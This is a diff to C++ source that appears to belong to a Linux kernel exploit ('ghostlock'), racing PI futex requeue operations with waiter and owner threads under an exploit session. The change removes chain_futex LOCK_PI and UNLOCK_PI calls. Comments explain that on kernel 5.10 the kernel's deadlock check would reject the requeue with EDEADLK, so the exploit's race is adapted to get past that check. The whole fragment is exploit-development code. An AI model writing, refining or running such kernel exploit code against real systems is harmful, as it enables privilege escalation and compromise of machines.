@@ -21,8 +21,13 @@ namespace ghostlock::race {
         support::disable_rseq_for_thread();
         int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
         race->waiter_tid.store(tid);
-        if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
-            pr_error("waiter lock chain errno=%d\n", errno);
+        /* 5.10: the chain_futex PI handshake (waiter LOCK_PI(chain) vs owner
+         * LOCK_PI(chain) while holding target) forms the ownership cycle
+         * waiter->target->owner->chain->waiter; the kernel's
+         * futex_lock_pi_atomic deadlock check then rejects the CMP requeue
+         * with -EDEADLK every attempt. The handshake is order-only — the
+         * owner_chain_done flag already carries it — so on this target the
+         * chain futex is not touched at all. */
         race->waiter_ready.store(1);
         while (!race->owner_started.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
@@ -66,7 +71,8 @@ namespace ghostlock::race {
             pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
         }
         race->route_done.store(1);
-        support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+        /* chain_futex is not part of the 5.10 handshake (see probe note at
+         * thread start); owner_chain_done is a plain atomic flag here. */
         while (!race->owner_chain_done.load())
             usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
         return nullptr;
@@ -88,7 +94,9 @@ namespace ghostlock::race {
             return nullptr;
         }
         race->owner_started.store(1);
-        support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
+        /* 5.10: no chain_futex LOCK_PI here — see waiter_thread probe note;
+         * blocking on a PI futex held by the waiter would close the
+         * waiter->target->owner->chain ownership cycle and EDEADLK the CMP. */
         race->owner_chain_done.store(1);
         while (!race->owner_stop.load()) sleep(1);
         if (lock_target == 0)
